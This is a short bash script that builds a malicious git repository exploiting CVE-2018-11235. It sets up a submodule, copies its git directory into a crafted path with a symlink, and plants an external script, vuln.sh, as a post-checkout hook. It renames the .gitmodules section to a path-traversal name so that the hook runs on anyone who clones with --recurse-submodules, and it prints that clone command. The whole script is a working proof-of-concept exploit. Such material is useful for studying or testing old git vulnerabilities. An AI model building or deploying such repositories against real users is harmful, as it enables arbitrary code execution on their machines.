#!/bin/bash

set -e

repo_sub="repo_sub"
git init "$repo_sub"
cd "$repo_sub"
touch blank
git add blank
git commit -m "test"
cd ..

repo_par="$PWD/repo_par"
git init "$repo_par"
cd "$repo_par"

repo_submodule='./../repo_sub'
git submodule add "$repo_submodule" vuln

#add symlink for git 2.7.4
mkdir -p modules/1/2/3/4
cp -r .git/modules/vuln modules/1/2/3/4
cd modules
ln -s 1/2/3/4/vuln vuln
cd ..

cp ../vuln.sh modules/vuln/hooks/post-checkout

git add modules

git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln

git submodule add "$repo_submodule"

git commit -m "CVE-2018-11235"

echo "git clone --recurse-submodules \"$repo_par\" dest_dir"
